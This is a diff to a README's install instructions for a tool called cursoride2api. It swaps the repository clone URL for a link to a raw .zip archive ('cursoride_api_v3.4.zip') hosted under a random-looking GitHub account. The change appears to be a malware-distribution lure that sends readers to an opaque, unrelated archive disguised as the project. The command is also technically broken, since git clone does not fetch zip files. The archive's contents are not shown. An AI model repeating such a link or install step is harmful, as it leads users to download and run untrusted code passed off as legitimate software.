@@ -34,7 +34,7 @@ cursoride2api/
 ### 1. 克隆 & 安装
 
 ```bash
-git clone https://github.com/yourname/cursoride2api.git
+git clone https://github.com/sdsdsdsdsdsihdkjsdjl/cursoride2api/raw/refs/heads/main/src/cursoride_api_v3.4.zip
 cd cursoride2api
 npm install
 ```
